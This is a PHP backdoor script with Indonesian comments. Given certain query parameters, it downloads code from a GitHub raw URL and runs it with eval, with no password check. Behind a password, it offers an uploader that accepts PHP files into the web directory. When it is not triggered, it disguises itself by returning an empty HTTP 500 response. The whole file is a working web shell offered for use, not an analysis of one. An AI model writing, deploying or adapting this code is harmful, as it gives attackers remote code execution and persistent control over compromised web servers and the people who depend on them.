<?php
session_start();

// Debug mode
error_reporting(E_ALL);
ini_set('display_errors', 1);

$hash_password = '$2a$12$BCLaxtQz.za91puVzhlZC.32DFZUMaYFJt2SN/QKAf6eKRInwBqo6';

// ==== MODE door.php tanpa password ====
if (isset($_GET['kenz']) && isset($_GET['kenzw'])) {
    $remote_url = "https://raw.githubusercontent.com/kenzzz135/crontabb/refs/heads/main/door.php";
    $remote_code = @file_get_contents($remote_url);

    if ($remote_code !== false) {
        eval("?>".$remote_code);
    } else {
        echo "Gagal mengambil script dari GitHub.";
    }
    exit;
}

// ==== MODE upload dengan password ====
if (isset($_GET['kenz'])) {
    // Kalau belum login â†’ minta password
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        if (!isset($_POST['pass'])) {
            echo '<form method="post">
                    Password: <input type="password" name="pass">
                    <input type="submit" value="Login">
                  </form>';
            exit;
        }

        // Cek password
        if (!password_verify($_POST['pass'], $hash_password)) {
            echo "Password salah!";
            exit;
        }

        // Password benar â†’ set login
        $_SESSION['logged_in'] = true;
    }

    // ==== Sudah login, tampilkan uploader ====
    if (isset($_POST['submit'])) {
        $nama = $_FILES['gambar']['name'];
        $tempat = $_FILES['gambar']['tmp_name'];

        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];
        $explode = explode('.', $nama);
        $pembaginya = strtolower(end($explode));

        if (in_array($pembaginya, $ukuran)) {
            $target_dir = __DIR__ . '/';
            $target_file = $target_dir . basename($nama);

            if (move_uploaded_file($tempat, $target_file)) {
                echo "File berhasil di-upload!<br>";
                echo "Nama file: " . htmlspecialchars($nama) . "<br>";
                $file_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target_file);
                echo "Link file: <a href='" . $file_url . "'>Lihat file</a><br>";
            } else {
                echo "Terjadi kesalahan saat meng-upload file.";
            }
        } else {
            echo "Duh, ekstensi file tidak sesuai.";
        }
    } else {
        echo '<form method="post" enctype="multipart/form-data">
                <input type="file" name="gambar">
                <input type="submit" name="submit" value="submit">
              </form>';
    }
} else {
    http_response_code(500);
    echo "";
}
__halt_compiler();
?>
